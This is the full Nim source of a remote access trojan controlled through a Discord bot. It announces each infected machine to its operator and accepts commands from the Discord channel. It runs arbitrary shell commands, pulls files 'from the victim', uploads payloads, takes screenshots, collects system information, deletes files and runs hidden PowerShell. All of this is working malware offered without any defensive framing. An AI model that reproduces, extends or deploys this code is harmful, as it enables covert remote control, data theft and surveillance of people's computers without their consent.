import dimscord, asyncdispatch, times, options, httpclient, osproc, os, strutils, json, threadpool, streams, random

const
  discordToken* = ""
  creatorId* = ""
let discord = newDiscordClient(discordToken)

var
  currentDir = getCurrentDir()
  sessionRegistry: seq[string] = @[]

proc runCommandSync(cmd: string): (string, int) =
  result = ("", -1)
  var p = startProcess(cmd,
    options = {poEvalCommand, poUsePath, poStdErrToStdOut})
  var output = newStringOfCap(4096)
  while not p.outputStream.atEnd:
    output.add(p.outputStream.readStr(4096))
  let exitCode = p.waitForExit()
  p.close()
  return (output, exitCode)

proc runBlockingCommand(cmd: string, pidHolder: ref int): string =
  var p = startProcess(cmd,
    options = {poEvalCommand, poUsePath, poStdErrToStdOut})
  pidHolder[] = p.processID
  var output = newStringOfCap(4096)
  while not p.outputStream.atEnd:
    output.add(p.outputStream.readStr(4096))
  discard p.waitForExit()
  p.close()
  return output

proc runCommandWithTimeoutKill(cmd: string, timeoutMs: int): Future[string] {.async.} =
  var pidHolder = new(int)
  let fut = spawn runBlockingCommand(cmd, pidHolder)

  var elapsed = 0
  let interval = 100   # ms

  while not isReady(fut) and elapsed < timeoutMs:
    await sleepAsync(interval)
    elapsed += interval

  if isReady(fut):
    return ^fut
  else:
    when defined(windows):
      discard execShellCmd("taskkill /PID " & $pidHolder[] & " /T /F")
    else:
      discard execShellCmd("kill -9 " & $pidHolder[])
    return "Command timed out and was terminated after " & $(timeoutMs div 1000) & " seconds."

proc sendMessage(channelId: string, content: string): Future[Message] {.async.} =
    result = await discord.api.sendMessage(channelId, content)

proc sendLongMessage(channelId: string, content: string): Future[void] {.async.} =
  const maxLen = 1980 # Leave room for code block characters
  if content.len == 0:
    discard await discord.api.sendMessage(channelId, "```\n(Command executed with no output)\n```")
  
  var remaining = content
  while remaining.len > 0:
    let chunk = if remaining.len > maxLen: remaining[0 ..< maxLen] else: remaining
    discard await discord.api.sendMessage(channelId, "```\n" & chunk & "\n```")
    if remaining.len > maxLen:
      remaining = remaining[maxLen .. ^1]
    else:
      remaining = ""

proc sendFile(channelId: string, filePath: string, fileName: string): Future[void] {.async.} =
    let fileContent = readFile(filePath)
    discard await discord.api.sendMessage(
        channelId,
        files = @[DiscordFile(name: fileName, body: fileContent)]
    )

proc handleCommand(rawCmd: string, m: Message, client: HttpClient): Future[string] {.async.} = 
  let cmd = rawCmd.strip()
  if cmd == "!help":
    return """Available Commands:
!help               - Shows this help message.
!ls or !dir         - List files in the current directory.
!cd <dir>           - Change directory.
!pwd                - Print the current working directory.
!upload             - Upload a file (attach it to the message).
!download <file>    - Download a file from the victim.
!mkdir <dir>        - Create a new directory.
!touch <file>       - Create a new empty file.
!rm <file/dir>      - Remove a file or directory.
!screencapture      - Take a screenshot and send it.
!sysinfo            - Get system information (OS, user, hostname).
!<command>          - Execute a shell command (e.g., !whoami).
"""

  if cmd == "!dir" or cmd == "!ls":
    when defined(windows):
      let (output, exitCode) = execCmdEx("cmd /c dir", options = {poUsePath}, workingDir = currentDir)
      if exitCode != 0:
        return "command failed with exit code " & $exitCode & ":\n" & output
      else:
        return output
    else:
      let (output, exitCode) = execCmdEx("ls", options = {poUsePath}, workingDir = currentDir)
      if exitCode != 0:
        return "command failed with exit code " & $exitCode & ":\n" & output
      else:
        return output

  elif cmd == "!pwd":
    return currentDir

  elif cmd == "!sysinfo":
    var resultMsg: string
    const maxLen = 1900
    when defined(linux):
      let (unameOut, unameExit) = execCmdEx("uname -a", options = {poUsePath}, workingDir = currentDir)
      let (lsbOut, lsbExit) = execCmdEx("bash -c \"lsb_release -d 2>/dev/null\"", options = {poUsePath}, workingDir = currentDir)
      if unameExit == 0:
        var info = unameOut
        if lsbExit == 0 and lsbOut.len > 0:
          info &= "\n" & lsbOut
        var remaining = info
        while remaining.len > 0:
          let chunk = if remaining.len > maxLen: remaining[0 ..< maxLen] else: remaining
          discard await sendMessage(m.channel_id, "```\n" & chunk & "\n```")
          if remaining.len > maxLen:
            remaining = remaining[maxLen .. ^1]
          else:
            remaining = ""
        resultMsg = "System info sent."
      else:
        resultMsg = "Failed to get system info: " & unameOut
    elif defined(windows):
      let powershellScript = "Get-ComputerInfo | ConvertTo-Json"
      let command = "powershell -NoProfile -WindowStyle Hidden -Command \"" & powershellScript & "\""
      let (output, exitCode) = execCmdEx(command, options = {poUsePath}, workingDir = currentDir)
      if exitCode != 0:
        resultMsg = "command failed with exit code " & $exitCode & ":\n" & output
      else:
        var remaining = output
        while remaining.len > 0:
          let chunk = if remaining.len > maxLen: remaining[0 ..< maxLen] else: remaining
          discard await sendMessage(m.channel_id, "```\n" & chunk & "\n```")
          if remaining.len > maxLen:
            remaining = remaining[maxLen .. ^1]
          else:
            remaining = ""
        resultMsg = "System info sent."
    elif defined(macosx):
      let (output, exitCode) = execCmdEx("system_profiler SPHardwareDataType", options = {poUsePath}, workingDir = currentDir)
      if exitCode != 0:
        resultMsg = "command failed with exit code " & $exitCode & ":\n" & output
      else:
        var remaining = output
        while remaining.len > 0:
          let chunk = if remaining.len > maxLen: remaining[0 ..< maxLen] else: remaining
          discard await sendMessage(m.channel_id, "```\n" & chunk & "\n```")
          if remaining.len > maxLen:
            remaining = remaining[maxLen .. ^1]
          else:
            remaining = ""
        resultMsg = "System info sent."
    else:
      resultMsg = "sysinfo not supported on this platform."
    return resultMsg

  elif cmd.startsWith("!cd "):
    let newDir = cmd[3..^1].strip()
    let targetDir = if os.isAbsolute(newDir): newDir else: os.joinPath(currentDir, newDir)
    if dirExists(targetDir):
      setCurrentDir(targetDir)
      currentDir = targetDir
      return "changed directory to " & currentDir
    else:
      return "directory not found: " & targetDir

  elif cmd.startsWith("!upload"):
    if m.attachments.len == 0:
      return "no file attached. Please send a file with the !upload command."
    else:
      let attachment = m.attachments[0]
      let downloadUrl = attachment.url
      let fileName = attachment.filename
      try:
        let fileData = client.getContent(downloadUrl)
        let savePath = os.joinPath(currentDir, fileName)
        writeFile(savePath, fileData)
        return "downloaded file to " & savePath
      except CatchableError as e:
        return "failed to download file: " & e.msg

  elif cmd.startsWith("!download "):
    let fileName = cmd[9..^1].strip()
    let filePath = joinPath(currentDir, fileName)
    if fileExists(filePath):
      await sendFile(m.channel_id, filePath, fileName)
      return "download successful"
    else:
      return "file not found: " & filePath

  elif cmd.startsWith("!mkdir "):
    let dirName = cmd[6..^1].strip()
    let dirPath = joinPath(currentDir, dirName)
    try:
      createDir(dirPath)
      return "created directory: " & dirPath
    except CatchableError as e:
      return e.msg

  elif cmd.startsWith("!touch "):
    let fileName = cmd[6..^1].strip()
    let filePath = joinPath(currentDir, fileName)
    try:
      writeFile(filePath, "")
      return "created file: " & filePath
    except CatchableError as e:
      return e.msg

  elif cmd.startsWith("!rm "):
    let target = cmd[3..^1].strip()
    let path = joinPath(currentDir, target)
    if fileExists(path):
      try:
        removeFile(path)
        return "Deleted file: " & path
      except CatchableError as e:
        return e.msg
    elif dirExists(path):
      try:
        removeDir(path)
        return "deleted directory: " & path 
      except CatchableError as e:
        return e.msg
    else:
      return "no such file or directory: " & path

  elif cmd == "!screencapture":
    when defined(macosx):
      let fileName = "screenshot_" & $now().toTime().toUnix() & ".jpg"
      let filePath = joinPath(currentDir, fileName)
      let (output, exitCode) = execCmdEx("screencapture -x " & filePath)
      if exitCode == 0 and fileExists(filePath):
        await sendFile(m.channel_id, filePath, fileName)
        if fileExists(filePath):
          removeFile(filePath)
        return "screenshot taken, sent and deleted!"
      else:
        return "failed to take screenshot: " & output
    elif defined(windows):
      let fileName = "screenshot_" & $now().toTime().toUnix() & ".png"
      let filePath = joinPath(currentDir, fileName)
      let powershellScript = """
          Add-Type -AssemblyName System.Windows.Forms
          Add-Type -AssemblyName System.Drawing
          $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
          $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
          $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
          $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
          $bitmap.Save('%1', [System.Drawing.Imaging.ImageFormat]::Png)
      """
      let command = "powershell -Command \"" & powershellScript.replace("%1", filePath.replace("\\", "\\\\")) & "\""
      let (output, exitCode) = execCmdEx(command)
      if exitCode == 0 and fileExists(filePath):
        await sendFile(m.channel_id, filePath, fileName)
        if fileExists(filePath):
          removeFile(filePath)
        return "Screenshot taken, sent and deleted!"
      else:
        return "failed to take screenshot: " & output
    else:
      return "screencapture not supported on this platform."

  else:
    try:
      var command = cmd[1..^1]
      when defined(macosx):
        return await runCommandWithTimeoutKill(command, 60000)
      elif defined(windows):
        command = "cmd /c " & command
        return await runCommandWithTimeoutKill(command, 60000)
      else:
        return "unsupported platform for direct command execution."
    except CatchableError as e:
      return "error running command: " & e.msg

proc getHostname(): string = 
  when defined(windows):
    let (output, exitCode) = execCmdEx("hostname")
    if exitCode == 0:
      return output.strip()
    else:
      return "unknown hostname"
  else:
    let (output, exitCode) = execCmdEx("hostname")
    if exitCode == 0:
      return output.strip()
    else:
      return "unknown hostname"

proc generateSessionId(): string =
  randomize()
  let hostname = getHostname().replace(" ", "-").strip()
  let uid = rand(1000..9999)
  when defined(windows):
    return "win-" & hostname & "-" & $uid
  elif defined(macosx):
    return "mac-" & hostname & "-" & $uid
  elif defined(linux):
    return "lin-" & hostname & "-" & $uid
  else:
    return "unk-" & $uid

var machineName: string

proc onReady(s: Shard, r: Ready) {.event(discord).} =
  machineName = getEnv("MACHINE_NAME", generateSessionId())
  if machineName notin sessionRegistry:
    sessionRegistry.add(machineName)
  try:
    let dm = await discord.api.createUserDm(creatorId)
    discard await discord.api.sendMessage(dm.id, machineName & " is live!")
  except:
    echo "Could not send startup message to creator ID: ", creatorId

proc messageCreate(s: Shard, m: Message) {.event(discord).} =
  var client = newHttpClient()
  let content = m.content.strip()
  echo "Processing command: ", content

  if content == "!sessions":
    let sessionList = if sessionRegistry.len == 0: "No active sessions." else: sessionRegistry.join("\n")
    discard await sendMessage(m.channel_id, sessionList)
    return
  elif content == "!ping":
    let before = epochTime() * 1000
    let msg = await discord.api.sendMessage(m.channel_id, "ping?")
    let after = epochTime() * 1000
    discard await discord.api.editMessage(m.channel_id, msg.id, "pong! took " & $int(after - before) & "ms | " & $s.latency() & "ms.")
    return
  
  if content.startsWith("!") and not content.startsWith("!sessions") and not content.startsWith("!ping"):
    let parts = content.split(' ', 1)
    let firstWord = parts[0]
    let isTargeted = firstWord.len > 1 and firstWord.startsWith("!") and not firstWord.startsWith("!!")

    if isTargeted:
      # Command is like "!session-name !command"
      let targetName = firstWord[1..^1]

      if targetName == machineName:
        let commandToRun = if parts.len > 1: parts[1].strip() else: ""
        if commandToRun.len > 0 and commandToRun.startsWith("!"):
          try:
            let output = await handleCommand(commandToRun, m, client)
            if output.len > 0:
              await sendLongMessage(m.channel_id, output)
          except CatchableError as e:
            discard await sendMessage(m.channel_id, "Error on " & machineName & ": " & e.msg)
        else:
          discard await sendMessage(m.channel_id, machineName & " is here!")
    else:
      try:
        let output = await handleCommand(content, m, client)
        if output.len > 0:
          await sendLongMessage(m.channel_id, output)
      except CatchableError as e:
        echo "Error executing command: ", e.msg
        discard await sendMessage(m.channel_id, "Error on " & machineName & ": " & e.msg)

proc main() =
  waitFor discord.startSession()
